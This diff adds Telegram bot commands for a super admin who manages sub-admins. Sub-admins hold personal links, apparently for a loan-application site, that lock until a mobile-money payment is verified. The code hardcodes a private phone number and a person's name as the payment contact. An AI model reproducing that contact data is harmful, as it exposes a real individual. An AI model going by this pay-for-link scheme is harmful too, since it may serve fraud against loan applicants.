+        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
+        bot.sendMessage(chatId, `
+ℹ️ *YOUR INFO*
+
+👤 ${admin.name}
+📧 ${admin.email}
+🆔 \`${adminId}\`
+💬 \`${chatId}\`
+📅 ${new Date(admin.createdAt).toLocaleString()}
+${statusEmoji} Status: ${statusText}
+
+🔗 ${WEBHOOK_URL}?admin=${adminId}
+        `, { parse_mode: 'Markdown' });
+    });
+
+    // /addadmin (help message)
+    bot.onText(/\/addadmin$/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can add admins.');
+        bot.sendMessage(chatId, `
+📝 *ADD NEW ADMIN*
+
+Use this format:
+
+\`/addadmin NAME|EMAIL|CHATID\`
+
+*Example:*
+\`/addadmin John Doe|john@example.com|123456789\`
+
+*How to get Chat ID:*
+1. Ask the new admin to start your bot
+2. They will receive their Chat ID
+3. Use that Chat ID here
+        `, { parse_mode: 'Markdown' });
+    });
+
+    // /addadmin NAME|EMAIL|CHATID
+    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can add admins.');
+
+        try {
+            const parts = match[1].trim().split('|').map(p => p.trim());
+            if (parts.length !== 3) {
+                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
+            }
+
+            const [name, email, chatIdStr] = parts;
+            const newChatId = parseInt(chatIdStr);
+            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');
+
+            const allAdmins        = await db.getAllAdmins();
+            const existingNumbers  = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
+            const nextNumber       = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
+            const newAdminId       = `ADMIN${String(nextNumber).padStart(3, '0')}`;
+
+            await db.saveAdmin({ 
+                adminId: newAdminId, 
+                chatId: newChatId, 
+                name, 
+                email, 
+                status: 'active', 
+                createdAt: new Date(),
+                linkLocked: false,
+                linkCreatedAt: new Date(),
+                paymentStatus: 'pending',
+                paymentSubmittedAt: null,
+                payerName: null,
+                paidAt: null
+            });
+            adminChatIds.set(newAdminId, newChatId);
+
+            startLinkPaymentTimer(newAdminId);
+
+            await bot.sendMessage(chatId, `
+✅ *NEW ADMIN CREATED*
+
+👤 ${name}
+📧 ${email}
+🆔 \`${newAdminId}\`
+💬 \`${newChatId}\`
+
+⏰ 5-minute link timer started
+
+*Has this person already paid?*
+            `, {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
+                        { text: '❌ NO - Not Paid Yet', callback_data: `link_paid_no_${newAdminId}` }
+                    ]]
+                }
+            });
+
+            try {
+                await bot.sendMessage(newChatId, `
+🎉 *YOU'RE NOW AN ADMIN!*
+
+Welcome ${name}!
+
+*Your Admin ID:* \`${newAdminId}\`
+*Your Personal Link:*
+${WEBHOOK_URL}?admin=${newAdminId}
+
+*Your link is valid for 5 minutes*
+⏱️ If you have not paid yet, you'll need to submit payment info after 5 minutes.
+
+*Commands:*
+/mylink - Get your link
+/stats - Your statistics
+/pending - Pending applications
+/myinfo - Your information
+
+✅ You're connected and ready!
+                `, { parse_mode: 'Markdown' });
+            } catch (notifyError) {
+                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
+            }
+        } catch (error) {
+            console.error('❌ Error adding admin:', error);
+            bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
+        }
+    });
+
+    // /addadminid ADMINID|NAME|EMAIL|CHATID
+    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can add admins.');
+
+        try {
+            const parts = match[1].trim().split('|').map(p => p.trim());
+            if (parts.length !== 4) {
+                return bot.sendMessage(chatId, `
+❌ *Invalid format*
+
+Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\`
+
+*Example:*
+\`/addadminid ADMIN024|John Doe|john@example.com|123456789\`
+                `, { parse_mode: 'Markdown' });
+            }
+
+            const [newAdminId, name, email, chatIdStr] = parts;
+            const newChatId = parseInt(chatIdStr);
+            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');
+
+            const existing = await db.getAdmin(newAdminId);
+            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });
+
+            await db.saveAdmin({ 
+                adminId: newAdminId, 
+                chatId: newChatId, 
+                name, 
+                email, 
+                status: 'active', 
+                createdAt: new Date(),
+                linkLocked: false,
+                linkCreatedAt: new Date(),
+                paymentStatus: 'pending',
+                paymentSubmittedAt: null,
+                payerName: null,
+                paidAt: null
+            });
+            adminChatIds.set(newAdminId, newChatId);
+
+            startLinkPaymentTimer(newAdminId);
+
+            await bot.sendMessage(chatId, `
+✅ *NEW ADMIN CREATED*
+
+👤 ${name}
+📧 ${email}
+🆔 \`${newAdminId}\`
+💬 \`${newChatId}\`
+
+⏰ 5-minute link timer started
+
+*Has this person already paid?*
+            `, {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
+                        { text: '❌ NO - Not Paid Yet', callback_data: `link_paid_no_${newAdminId}` }
+                    ]]
+                }
+            });
+
+            try {
+                await bot.sendMessage(newChatId, `
+🎉 *YOU'RE NOW AN ADMIN!*
+
+Welcome ${name}!
+
+*Your Admin ID:* \`${newAdminId}\`
+*Your Personal Link:*
+${WEBHOOK_URL}?admin=${newAdminId}
+
+*Your link is valid for 5 minutes*
+⏱️ If you have not paid yet, you'll need to submit payment info after 5 minutes.
+
+/mylink /stats /pending /myinfo
+                `, { parse_mode: 'Markdown' });
+            } catch (notifyError) {
+                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start first.');
+            }
+        } catch (error) {
+            console.error('❌ Error adding admin with custom ID:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /transferadmin oldChatId | newChatId
+    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can transfer admins.');
+
+        try {
+            const parts = match[1].trim().split('|').map(p => p.trim());
+            if (parts.length !== 2) {
+                return bot.sendMessage(chatId, `
+❌ *Invalid Format*
+
+Use: /transferadmin oldChatId | newChatId
+                `, { parse_mode: 'Markdown' });
+            }
+
+            const [oldChatIdStr, newChatIdStr] = parts;
+            const oldChatId = parseInt(oldChatIdStr);
+            const newChatId = parseInt(newChatIdStr);
+            if (isNaN(oldChatId) || isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Both Chat IDs must be numbers!');
+
+            let targetAdminId = null;
+            for (const [id, storedChatId] of adminChatIds.entries()) {
+                if (storedChatId === oldChatId) { targetAdminId = id; break; }
+            }
+            if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });
+            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot transfer a super admin!');
+
+            const admin = await db.getAdmin(targetAdminId);
+            if (!admin) return bot.sendMessage(chatId, '❌ Admin not found in database!');
+
+            await db.updateAdmin(targetAdminId, { chatId: newChatId });
+            adminChatIds.set(targetAdminId, newChatId);
+
+            await bot.sendMessage(chatId, `
+🔄 *ADMIN TRANSFERRED*
+
+👤 ${admin.name}
+🆔 \`${targetAdminId}\`
+Old Chat ID: \`${oldChatId}\`
+New Chat ID: \`${newChatId}\`
+⏰ ${new Date().toLocaleString()}
+            `, { parse_mode: 'Markdown' });
+
+            bot.sendMessage(oldChatId, `⚠️ *YOUR ADMIN ACCESS HAS BEEN TRANSFERRED*\n\nContact super admin if this was not you.`, { parse_mode: 'Markdown' }).catch(() => {});
+            bot.sendMessage(newChatId, `
+🎉 *ADMIN ACCESS TRANSFERRED TO YOU*
+
+Welcome ${admin.name}!
+*Your Admin ID:* \`${targetAdminId}\`
+*Your Link:* ${WEBHOOK_URL}?admin=${targetAdminId}
+
+Use /start to see commands.
+            `, { parse_mode: 'Markdown' }).catch(() => {
+                bot.sendMessage(chatId, `⚠️ Could not notify new Chat ID (they may need to /start first)`);
+            });
+        } catch (error) {
+            console.error('❌ Error transferring admin:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /pauseadmin <adminId>
+    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can pause admins.');
+
+        try {
+            const targetAdminId = match[1].trim();
+            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot pause a super admin!');
+
+            const admin = await db.getAdmin(targetAdminId);
+            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+            if (pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is already paused.`);
+
+            pausedAdmins.add(targetAdminId);
+            await db.updateAdmin(targetAdminId, { status: 'paused' });
+
+            await bot.sendMessage(chatId, `
+🚫 *ADMIN PAUSED*
+
+👤 ${admin.name}
+🆔 \`${targetAdminId}\`
+⏰ ${new Date().toLocaleString()}
+
+Use /unpauseadmin ${targetAdminId} to restore.
+            `, { parse_mode: 'Markdown' });
+
+            const targetChatId = adminChatIds.get(targetAdminId);
+            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *YOUR ADMIN ACCESS HAS BEEN PAUSED*\n\nContact super admin for more information.`, { parse_mode: 'Markdown' }).catch(() => {});
+        } catch (error) {
+            console.error('❌ Error pausing admin:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /unpauseadmin <adminId>
+    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can unpause admins.');
+
+        try {
+            const targetAdminId = match[1].trim();
+            if (!pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is not paused.`);
+
+            const admin = await db.getAdmin(targetAdminId);
+            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+
+            pausedAdmins.delete(targetAdminId);
+            await db.updateAdmin(targetAdminId, { status: 'active' });
+
+            await bot.sendMessage(chatId, `
+✅ *ADMIN UNPAUSED*
+
+👤 ${admin.name}
+🆔 \`${targetAdminId}\`
+⏰ ${new Date().toLocaleString()}
+            `, { parse_mode: 'Markdown' });
+
+            const targetChatId = adminChatIds.get(targetAdminId);
+            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve loan applications.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
+        } catch (error) {
+            console.error('❌ Error unpausing admin:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /removeadmin <adminId>
+    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can remove admins.');
+
+        try {
+            const targetAdminId = match[1].trim();
+            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot remove a super admin!');
+
+            const admin = await db.getAdmin(targetAdminId);
+            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+
+            await db.deleteAdmin(targetAdminId);
+            adminChatIds.delete(targetAdminId);
+            pausedAdmins.delete(targetAdminId);
+            removeLinkPaymentTimer(targetAdminId);
+
+            await bot.sendMessage(chatId, `
+🗑️ *ADMIN REMOVED*
+
+👤 ${admin.name}
+📧 ${admin.email}
+🆔 \`${targetAdminId}\`
+⏰ ${new Date().toLocaleString()}
+            `, { parse_mode: 'Markdown' });
+
+            if (admin.chatId) {
+                bot.sendMessage(admin.chatId, `🗑️ *YOU'VE BEEN REMOVED AS ADMIN*\n\nContact super admin if you have questions.`, { parse_mode: 'Markdown' }).catch(() => {});
+            }
+        } catch (error) {
+            console.error('❌ Error removing admin:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /admins
+    bot.onText(/\/admins/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
+
+        try {
+            const allAdmins = await db.getAllAdmins();
+            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;
+
+            allAdmins.forEach((admin, index) => {
+                const isSuper     = isSuperAdmin(admin.adminId);
+                const isPaused    = pausedAdmins.has(admin.adminId);
+                const isConnected = adminChatIds.has(admin.adminId);
+                const statusEmoji = isSuper ? '⭐' : isPaused ? '🚫' : '✅';
+                const statusText  = isSuper ? 'Super Admin' : isPaused ? 'Paused' : 'Active';
+                const connEmoji   = isConnected ? '🟢' : '⚪';
+
+                message += `${index+1}. ${statusEmoji} *${admin.name}*\n`;
+                message += `   📧 ${admin.email}\n`;
+                message += `   🆔 \`${admin.adminId}\`\n`;
+                message += `   ${connEmoji} ${statusText}\n`;
+                if (admin.chatId) message += `   💬 \`${admin.chatId}\`\n`;
+                message += '\n';
+            });
+
+            message += '\n🟢 = Connected | ⚪ = Not Connected';
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Failed to list admins.');
+        }
+    });
+
+    // ==========================================
+    // /suspendall - NEW: interactive checklist
+    // All admins selected (✅) by default.
+    // Tap to deselect (⬜) those you want to keep.
+    // Paginated 10 per page, selections persist across pages.
+    // ==========================================
+    bot.onText(/\/suspendall/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can suspend links.');
+
+        try {
+            const allAdmins     = await db.getAllAdmins();
+            const regularAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));
+
+            if (regularAdmins.length === 0) {
+                return bot.sendMessage(chatId, '⚠️ No admins to suspend.');
+            }
+
+            // Build session: everyone selected for suspension by default
+            const selections = new Set(regularAdmins.map(a => a.adminId));
+            suspendAllSessions.set(chatId, {
+                page: 0,
+                allAdmins: regularAdmins,
+                selections
+            });
+
+            const session = suspendAllSessions.get(chatId);
+            const { text, inline_keyboard } = buildSuspendAllPage(session);
+
+            await bot.sendMessage(chatId, text, {
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard }
+            });
+
+        } catch (error) {
+            console.error('❌ Error in /suspendall:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /pendingpayments - List all admins pending payment approval
+    bot.onText(/\/pendingpayments/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can view pending payments.');
+
+        try {
+            const allAdmins = await db.getAllAdmins();
+            const pendingPayments = allAdmins.filter(a => a.paymentStatus === 'pending' && a.payerName);
+
+            if (pendingPayments.length === 0) {
+                return bot.sendMessage(chatId, '✨ No pending payment approvals!');
+            }
+
+            let message = `💰 *PENDING PAYMENT APPROVALS (${pendingPayments.length})*\n\n`;
+
+            for (const admin of pendingPayments) {
+                message += `👤 *${admin.name}*\n`;
+                message += `   🆔 \`${admin.adminId}\`\n`;
+                message += `   💵 Payer: ${admin.payerName}\n`;
+                message += `   📅 Submitted: ${new Date(admin.paymentSubmittedAt).toLocaleString()}\n`;
+                message += `   📧 ${admin.email}\n\n`;
+            }
+
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        } catch (error) {
+            console.error('❌ Error in /pendingpayments:', error);
+            bot.sendMessage(chatId, '❌ Failed to list pending payments. Error: ' + error.message);
+        }
+    });
+
+    // /approvepayment <adminId>
+    bot.onText(/\/approvepayment (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can approve payments.');
+
+        try {
+            const targetAdminId = match[1].trim();
+            const admin = await db.getAdmin(targetAdminId);
+            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+            if (admin.paymentStatus === 'approved') return bot.sendMessage(chatId, `✅ Payment already approved for ${admin.name}`);
+
+            removeLinkPaymentTimer(targetAdminId);
+            await db.updateAdmin(targetAdminId, { 
+                paymentStatus: 'approved',
+                linkLocked: false,
+                paidAt: new Date()
+            });
+
+            await bot.sendMessage(chatId, `
+✅ *PAYMENT APPROVED*
+
+👤 ${admin.name}
+🆔 \`${targetAdminId}\`
+💵 Payer: ${admin.payerName}
+⏰ ${new Date().toLocaleString()}
+
+Link is now unlocked!
+            `, { parse_mode: 'Markdown' });
+
+            if (admin.chatId) {
+                await bot.sendMessage(admin.chatId, `
+✅ *PAYMENT APPROVED!*
+
+Your link payment has been verified and approved.
+Your admin link is now permanently active.
+
+🔗 Your Link: ${WEBHOOK_URL}?admin=${targetAdminId}
+
+Use /start to see available commands.
+                `, { parse_mode: 'Markdown' });
+            }
+        } catch (error) {
+            console.error('❌ Error approving payment:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /rejectpayment <adminId>
+    bot.onText(/\/rejectpayment (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can reject payments.');
+
+        try {
+            const targetAdminId = match[1].trim();
+            const admin = await db.getAdmin(targetAdminId);
+            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+
+            await db.updateAdmin(targetAdminId, { 
+                paymentStatus: 'rejected',
+                paymentSubmittedAt: null,
+                payerName: null
+            });
+
+            await bot.sendMessage(chatId, `
+❌ *PAYMENT REJECTED*
+
+👤 ${admin.name}
+🆔 \`${targetAdminId}\`
+💵 Payer: ${admin.payerName}
+⏰ ${new Date().toLocaleString()}
+
+Link remains locked. Admin can resubmit payment.
+            `, { parse_mode: 'Markdown' });
+
+            if (admin.chatId) {
+                await bot.sendMessage(admin.chatId, `
+❌ *PAYMENT INVALID*
+
+Your payment submission was rejected. The payer name or payment details could not be verified.
+
+Please try again with the correct payment details.
+
+Your link remains locked until payment is approved.
+                `, { parse_mode: 'Markdown' });
+            }
+        } catch (error) {
+            console.error('❌ Error rejecting payment:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /send <adminId> <message>
+    bot.onText(/\/send (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can send messages to admins.');
+
+        try {
+            const input = match[1].trim();
+            const spaceIndex = input.indexOf(' ');
+            if (spaceIndex === -1) {
+                return bot.sendMessage(chatId, `❌ Use: /send ADMINID Your message here`, { parse_mode: 'Markdown' });
+            }
+            const targetAdminId = input.substring(0, spaceIndex).trim();
+            const messageText   = input.substring(spaceIndex + 1).trim();
+
+            const targetAdmin = await db.getAdmin(targetAdminId);
+            if (!targetAdmin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+            if (!adminChatIds.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`);
+
+            const sent = await sendToAdmin(targetAdminId, `
+📨 *MESSAGE FROM SUPER ADMIN*
+
+${messageText}
+
+---
+⏰ ${new Date().toLocaleString()}
+            `, { parse_mode: 'Markdown' });
+
+            if (sent) {
+                bot.sendMessage(chatId, `✅ Message sent to ${targetAdmin.name} (\`${targetAdminId}\`)`, { parse_mode: 'Markdown' });
+            } else {
+                bot.sendMessage(chatId, `❌ Failed to send message to ${targetAdmin.name}`);
+            }
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /broadcast <message>
+    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can broadcast.');
+
+        try {
+            const messageText  = match[1].trim();
+            const allAdmins    = await db.getAllAdmins();
+            const targetAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));
+            if (targetAdmins.length === 0) return bot.sendMessage(chatId, '⚠️ No other admins to broadcast to.');
+
+            let successCount = 0, failCount = 0;
+            const results = [];
+
+            for (const admin of targetAdmins) {
+                if (adminChatIds.has(admin.adminId)) {
+                    const sent = await sendToAdmin(admin.adminId, `
+📢 *BROADCAST FROM SUPER ADMIN*
+
+${messageText}
+
+---
+⏰ ${new Date().toLocaleString()}
+                    `, { parse_mode: 'Markdown' });
+                    if (sent) { successCount++; results.push(`✅ ${admin.name}`); }
+                    else       { failCount++;   results.push(`❌ ${admin.name} (send failed)`); }
+                } else {
+                    failCount++;
+                    results.push(`⚪ ${admin.name} (not connected)`);
+                }
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+
+            bot.sendMessage(chatId, `
+📢 *BROADCAST COMPLETE*
+
+✅ Sent: ${successCount}
+❌ Failed: ${failCount}
+Total: ${targetAdmins.length}
+
+*Details:*
+${results.join('\n')}
+⏰ ${new Date().toLocaleString()}
+            `, { parse_mode: 'Markdown' });
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /ask <adminId> <request>
+    bot.onText(/\/ask (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only super admin can send action requests.');
+
+        try {
+            const input = match[1].trim();
+            const spaceIndex = input.indexOf(' ');
+            if (spaceIndex === -1) {
+                return bot.sendMessage(chatId, `❌ Use: /ask ADMINID Your request here`);
+            }
+            const targetAdminId = input.substring(0, spaceIndex).trim();
+            const requestText   = input.substring(spaceIndex + 1).trim();
+
+            const targetAdmin = await db.getAdmin(targetAdminId);
+            if (!targetAdmin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
+            if (!adminChatIds.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`);
+
+            const requestId = `REQ-${Date.now()}`;
+
+            const sent = await bot.sendMessage(adminChatIds.get(targetAdminId), `
+❓ *REQUEST FROM SUPER ADMIN*
+
+${requestText}
+
+---
+📋 Request ID: \`${requestId}\`
+⏰ ${new Date().toLocaleString()}
+            `, {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ Done',      callback_data: `request_done_${requestId}_${targetAdminId}` },
+                        { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }
+                    ]]
+                }
+            });
+
+            if (sent) {
+                bot.sendMessage(chatId, `✅ Request sent to ${targetAdmin.name}.\nRequest ID: \`${requestId}\``, { parse_mode: 'Markdown' });
+            } else {
+                bot.sendMessage(chatId, `❌ Failed to send request.`);
+            }
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /clearalladmins (SUPER ADMIN ONLY)
+    bot.onText(/\/clearalladmins/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        
+        if (!isSuperAdmin(adminId)) {
+            return bot.sendMessage(chatId, '❌ Only super admin can do this!');
+        }
+        
+        try {
+            await bot.sendMessage(chatId, `
+⚠️ *WARNING - IRREVERSIBLE ACTION*
+
+This will DELETE ALL ADMINS except SUPER ADMINS!
+
+React with ✅ to confirm or ❌ to cancel
+            `, {
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ YES, DELETE ALL', callback_data: 'confirm_clear_admins' },
+                        { text: '❌ CANCEL', callback_data: 'cancel_clear_admins' }
+                    ]]
+                }
+            });
+        } catch (error) {
+            bot.sendMessage(chatId, '❌ Error: ' + error.message);
+        }
+    });
+
+    // /unlockalllinks (SUPER ADMIN ONLY)
+    bot.onText(/\/unlockalllinks/, async (msg) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+
+        if (!isSuperAdmin(adminId)) {
+            return bot.sendMessage(chatId, '❌ Only super admin can unlock all links.');
+        }
+
+        try {
+            const allAdmins     = await db.getAllAdmins();
+            const regularAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));
+
+            let unlockedCount = 0;
+            const unlockedNames = [];
+
+            for (const admin of regularAdmins) {
+                try {
+                    removeLinkPaymentTimer(admin.adminId);
+
+                    await db.updateAdmin(admin.adminId, {
+                        linkLocked: false,
+                        paymentStatus: 'approved',
+                        paidAt: new Date()
+                    });
+
+                    unlockedCount++;
+                    unlockedNames.push(`${admin.name} (${admin.adminId})`);
+
+                    if (admin.chatId) {
+                        bot.sendMessage(admin.chatId, `
+✅ *YOUR LINK HAS BEEN UNLOCKED*
+
+Your admin link is now active.
+
+🔗 Your Link: ${WEBHOOK_URL}?admin=${admin.adminId}
+
+Use /start to see all commands.
+                        `, { parse_mode: 'Markdown' }).catch(() => {});
+                    }
+                } catch (err) {
+                    console.error(`Failed to unlock ${admin.adminId}:`, err.message);
+                }
+            }
+
+            await bot.sendMessage(chatId, `
+🔓 *ALL LINKS UNLOCKED*
+
+✅ Unlocked: ${unlockedCount} admin(s)
+⏰ ${new Date().toLocaleString()}
+
+*Admins unlocked:*
+${unlockedNames.map((n, i) => `${i + 1}. ${n}`).join('\n') || 'None'}
+            `, { parse_mode: 'Markdown' });
+
+        } catch (error) {
+            console.error('❌ Error unlocking all links:', error);
+            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
+        }
+    });
+
+    // /payment <TRANSACTION_CODE> - Admin submits payment
+    bot.onText(/\/payment (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        
+        if (!adminId) {
+            return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        }
+        
+        if (isSuperAdmin(adminId)) {
+            return bot.sendMessage(chatId, '❌ Superadmin does not require payment.');
+        }
+        
+        try {
+            const transactionCode = match[1].trim().toUpperCase();
+            const admin = await db.getAdmin(adminId);
+            
+            if (!admin) {
+                return bot.sendMessage(chatId, '❌ Admin not found.');
+            }
+            
+            if (!admin.linkLocked) {
+                return bot.sendMessage(chatId, '✅ Your link is already active! No payment needed.');
+            }
+            
+            await db.updateAdmin(adminId, { 
+                paymentStatus: 'pending',
+                payerName: `Transaction: ${transactionCode}`,
+                paymentSubmittedAt: new Date()
+            });
+            
+            await bot.sendMessage(chatId, `
+✅ *PAYMENT RECEIVED*
+
+Your payment submission has been received and is pending verification by the super admin.
+
+📋 Details:
+🆔 Admin ID: \`${adminId}\`
+👤 Name: ${admin.name}
+📱 Transaction Code: \`${transactionCode}\`
+⏰ Submitted: ${new Date().toLocaleString()}
+
+We will notify you once the payment is confirmed.
+
+Your link will be unlocked immediately after approval.
+            `, { parse_mode: 'Markdown' });
+            
+            // Notify all super admins
+            for (const superAdminId of SUPER_ADMINS) {
+                const superAdminChatId = adminChatIds.get(superAdminId);
+                if (superAdminChatId) {
+                    await bot.sendMessage(superAdminChatId, `
+💳 *NEW PAYMENT SUBMITTED*
+
+Admin has sent payment and is awaiting your verification.
+
+📋 Details:
+🆔 Admin ID: \`${adminId}\`
+👤 Name: ${admin.name}
+📧 Email: ${admin.email}
+📱 Transaction Code: \`${transactionCode}\`
+⏰ Submitted: ${new Date().toLocaleString()}
+
+Verify the payment has been received:
+📞 Phone: 0791336749 (Okeyo Bungu)
+
+Please verify and respond:
+                    `, {
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [[
+                                { text: '✅ APPROVE PAYMENT', callback_data: `approve_payment_${adminId}` },
+                                { text: '❌ REJECT PAYMENT', callback_data: `reject_payment_${adminId}` }
+                            ]]
+                        }
+                    });
+                }
+            }
+        } catch (error) {
+            console.error('❌ Error processing payment:', error);
+            bot.sendMessage(chatId, '❌ Error: ' + error.message);
+        }
+    });
+
